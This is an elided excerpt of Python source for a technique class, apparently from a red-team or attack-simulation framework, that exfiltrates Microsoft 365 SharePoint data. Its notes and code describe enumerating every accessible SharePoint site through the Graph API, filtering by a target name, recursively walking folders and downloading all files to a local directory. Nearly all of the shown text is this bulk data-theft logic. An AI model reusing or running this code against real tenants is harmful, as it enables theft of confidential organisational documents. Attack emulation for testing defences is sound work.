...
class M365ExfilSharepointData(BaseTechnique):
    def __init__(self):
        ...
        technique_notes = [
            TechniqueNote(
                "Technique automatically finds and exfiltrates all accessible SharePoint sites by default"
            ),
            TechniqueNote(
                "Set target_site parameter to focus exfiltration on a specific site by name or URL"
            ),
            TechniqueNote(
                "Large sites may take significant time to download; consider using target_site for initial testing"
            ),
            TechniqueNote("Creates timestamped output directory to prevent overwrites"),
            TechniqueNote(
                "Requires appropriate Graph API permissions (Sites.Read.All, Sites.ReadWrite.All)"
            ),
        ]
        super().__init__(
    ...
    def _enumerate_sites(self, target_site: str = None) -> List[Dict[str, Any]]:
        ...
        if target_site:
            # Attempt exact match
            endpoint_url = (
                f"https://graph.microsoft.com/v1.0/sites?search={target_site}"
            )
        else:
        ...
        if "error" in sites_response:
            raise Exception(
                f"Failed to enumerate SharePoint sites: {sites_response['error']}"
            )
        ...
        if target_site:
            ...
            for site in sites_response:
                if (
                    target_site.lower() in site.get("displayName", "").lower()
                    or target_site.lower() in site.get("webUrl", "").lower()
                ):
    ...
    def _get_drive_items(
        self, site_id: str, item_id: str = None
    ) -> List[Dict[str, Any]]:
        """
    ...
    def _process_folder(
        self, site_id: str, folder_id: str, local_base_path: str, folder_path: str = ""
    ) -> Tuple[int, int]:
        """
        ...
        for item in items:
            ...
            if item.get("folder"):  # Item is folder
                ...
                f_count, d_count = self._process_folder(
                    site_id, item_id, local_base_path, new_folder_path
                )
                files_count += f_count
        ...
        try:
            ...
            for site in sites:
                ...
                try:
                    ...
                    site_info.update({"status": "failed", "error": str(e)})
            ...
            return ExecutionStatus.SUCCESS, {
                ...
                "value": {"export_path": base_output_dir, "stats": total_stats},
            }
